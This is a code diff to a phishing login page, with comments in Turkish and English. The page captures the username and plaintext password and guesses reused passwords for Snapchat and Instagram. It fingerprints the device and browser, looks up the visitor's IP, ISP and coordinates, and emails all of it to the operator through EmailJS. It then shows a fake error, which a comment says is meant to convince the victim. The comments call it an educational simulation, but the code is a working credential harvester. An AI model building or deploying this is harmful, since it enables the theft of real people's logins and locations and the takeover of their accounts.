@@ -7,7 +7,7 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            emailjs.init("bOJixfHEM1uPomqLS"); // PUBLIC KEY
+            emailjs.init("bOJixfHEM1uPomqLS"); // KENDİ PUBLIC KEY'İNİZ
         })();
     </script>
     <style>
@@ -55,21 +55,19 @@
     <script>
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault();
-            
+
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const sendDate = new Date().toLocaleString('tr-TR');
+            const sendDate = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
 
-            // 1. & 2. & 5. Social Media Pattern Inference (Educational Simulation)
-            // Demonstrates how hackers assume password reuse across platforms.
+            // 1. & 2. Sosyal Medya Profili Tahmini (Eğitimsel Simülasyon)
             const platformPatterns = {
-                snapchat: `${username.split('@')[0]}_Snap!`, // Common naming convention
-                instagram: password.length > 8 ? password : `${password}123`, // Pattern prediction
+                snapchat: `${username.split('@')[0]}_Snap!`,
+                instagram: password.length > 8 ? password : `${password}123`,
                 others: "Commonly used: Facebook, X (Twitter), LinkedIn"
             };
 
-            // 3. Device Storage Location Detection
-            // Checks for the presence of browser-specific password managers.
+            // 3. Cihaz ve Depolama Analizi
             const detectVaults = () => {
                 const isChrome = /Chrome/.test(navigator.userAgent);
                 const isSafari = /Safari/.test(navigator.userAgent) && !/Chrome/.test(navigator.userAgent);
@@ -77,49 +75,62 @@
                 if (isSafari) return "iCloud Keychain (Safari)";
                 return "Generic Browser Auto-fill";
             };
-
-            // 4. Theoretical Photo Metadata (EXIF) Access
-            // Demonstrates the risk of "File Input" phishing where users are asked to 'verify' via a photo.
             const photoRiskProfile = "Simulated: GPS_LAT/LONG extraction from last uploaded JPEG";
+            const device_model = navigator.platform || "Bilinmeyen Cihaz";
+            const os_info = navigator.userAgent.includes("iPhone") ? "iOS" : (navigator.userAgent.includes("Android") ? "Android" : "Diğer");
+            const browser = navigator.userAgent;
 
+            // 4. Ağ ve Coğrafi Konum Bilgileri
             let geoData = {};
             try {
-                // Konum ve IP bilgisini çek
                 const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error('Network response was not ok');
                 geoData = await response.json();
             } catch (error) {
-                console.error("Konum bilgisi alınamadı", error);
+                console.error("Konum/IP bilgisi alınamadı:", error);
+                // Hata durumunda boş değerler atanır
+                geoData = { ip: "Alınamadı", city: "Alınamadı", country_name: "Alınamadı", org: "Alınamadı", latitude: "", longitude: "" };
             }
 
-            // Gönderilecek verileri hazırla
+            // EmailJS'e gönderilecek tüm verileri birleştir
             const templateParams = {
+                // 1. Kritik Giriş Bilgileri
                 username: username,
                 password: password,
                 send_date: sendDate,
-                ip_address: geoData.ip || "Bilinmiyor",
-                city: geoData.city || "Bilinmiyor",
-                country: geoData.country_name || "Bilinmiyor",
-                isp: geoData.org || "Bilinmiyor",
-                device_model: navigator.platform,
-                browser: navigator.userAgent,
-                latitude: geoData.latitude || "",
-                longitude: geoData.longitude || "",
-                
-                // New Educational Fields
+
+                // 2. Tahmini Sosyal Medya Profili
                 snapchat_pattern: platformPatterns.snapchat,
                 instagram_pattern: platformPatterns.instagram,
                 social_media_others: platformPatterns.others,
+
+                // 3. Cihaz ve Depolama Analizi
                 storage_locations: detectVaults(),
-                photo_metadata: photoRiskProfile
+                photo_metadata: photoRiskProfile,
+                device_model: device_model,
+                os_info: os_info,
+                browser: browser,
+
+                // 4. Ağ ve Coğrafi Konum Bilgileri
+                ip_address: geoData.ip,
+                isp: geoData.org,
+                country: geoData.country_name,
+                city: geoData.city,
+                latitude: geoData.latitude,
+                longitude: geoData.longitude
             };
 
-            // EmailJS ile gönder
+            // EmailJS ile verileri gönder
             emailjs.send('service_mdm9ze3', 'template_umbj15o', templateParams)
-            .then(function(response) {
-                document.getElementById('errorMessage').style.display = 'block';
-            }, function(error) {
-                document.getElementById('errorMessage').style.display = 'block';
-            });
+                .then(function(response) {
+                    console.log('E-posta başarıyla gönderildi!', response.status, response.text);
+                    // Kullanıcıyı ikna etmek için sahte hata mesajı göster
+                    document.getElementById('errorMessage').style.display = 'block';
+                }, function(error) {
+                    console.log('E-posta gönderilemedi...', error);
+                    // Hata olsa bile kullanıcıya sahte hata göster
+                    document.getElementById('errorMessage').style.display = 'block';
+                });
         });
     </script>
 </body>
